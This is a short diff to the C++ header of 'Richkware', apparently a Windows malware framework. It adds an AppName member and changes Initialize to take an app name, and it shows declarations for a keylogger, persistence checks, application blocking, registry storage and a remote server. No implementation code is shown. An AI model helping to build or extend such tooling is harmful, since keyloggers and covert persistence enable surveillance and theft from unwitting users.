@@ -39,6 +39,7 @@ class Richkware {
 private:
 	HANDLE hBlockAppsTh;
 	std::map<std::string, std::string> session;
+	std::string AppName;
 
 	void SaveValueReg(const char* path, const char* key, const char* value);
 	std::string LoadValueReg(const char* path, const char* key);
@@ -66,7 +67,7 @@ public:
 	void Keylogger(const char* fileName);
 	bool CheckSession();
 	bool CheckPersistance();
-	void Initialize(const char* EncryptionKey);
+	void Initialize(const char* AppName, const char* EncryptionKey);
 
 	int StartServer(const char* port, const char* EncryptionKey = NULL);
 	const char* RawRequest(const char * serverAddress, const char* port, const char* request);
